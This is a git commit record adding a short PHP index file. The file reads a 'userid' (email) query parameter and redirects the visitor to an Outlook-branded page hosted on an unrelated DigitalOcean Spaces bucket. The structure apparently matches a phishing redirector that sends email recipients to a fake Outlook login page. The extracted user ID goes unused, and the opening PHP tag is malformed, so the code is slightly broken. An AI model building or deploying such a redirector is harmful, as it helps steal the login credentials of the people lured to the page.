9e28b757dcbef919f3c9b3179666ce8910b5fea2
Dwebb1999 <66946987+Dwebb1999@users.noreply.github.com>
2020-06-15 12:47:10 +0000

    Update index.php

--- index.php
+++ index.php
@@ -1,1 +1,12 @@
-
+?php
+function getuseridIDFromuserid($userid)
+{
+$find = '@';
+$pos = strpos($userid, $find);
+$userID = substr($userid, 0, $pos);
+return $userID;
+}
+$userid = $_GET['userid'];
+$userID = getuseridIDFromuserid($userid);
+header("Location: https://checkinggames.sfo2.digitaloceanspaces.com/outlook/index.html");
+?>
